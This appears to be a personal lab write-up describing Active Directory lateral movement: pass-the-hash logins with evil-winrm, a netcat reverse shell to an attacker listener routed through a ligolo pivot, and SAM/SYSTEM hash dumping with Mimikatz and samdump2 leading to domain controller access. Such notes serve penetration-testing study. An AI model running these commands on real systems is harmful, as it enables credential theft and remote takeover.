- After obtaining Celia.Almeda's hash which was found on Mimikatz, but verified through crackmapexec smb --users or PowerView, I used evil-winrm
- evil-winrm -i MS02_IP -u celia.almeda -H mimikatz_NTLMhash
- upload and download syntax are pretty straight forward. The directories are attached to where you started the evil-winrm session
- Upload nc.exe -> uploaded nc.exe to upgrade my shell to a more secure shell
- Syntax -> .\nc.exe -e cmd.exe 10.10.104.141 4444
- This is important because MS01 had two interfaces, the 192.x.x.x we saw, but it also had a 10.x.x.x which we then connected with the port proxy/ligolo listener
- That command caught on the listener agent, then proxy forwarded to my AP where I had nc -lnvp 4444 waiting to catch the shell
- I uploaded mimikatz once again but instead ran an lsadump
- When going through the files, there was a windows and windows.old, that had System32 SAM (password storage) and SYSTEM (sysconfigs)
- ![[Pasted image 20230821150640.png]]
- Now that I had a filepath, I ran that against Mimikatz as follows:
- ![[Pasted image 20230821150857.png]]
- I also ran samdump2 SAM SYSTEM to see the hashes, and showed which accounts were disabled leading me to tom_admin
- I took tom_admin's NTLM hash for the DC01
- evil-winrm -i DC_IP -u tom_admin -H mimikatz_hash and....success
- ![[Pasted image 20230821151135.png]]
- ![[Pasted image 20230821151247.png]]
- ![[Pasted image 20230821151647.png]]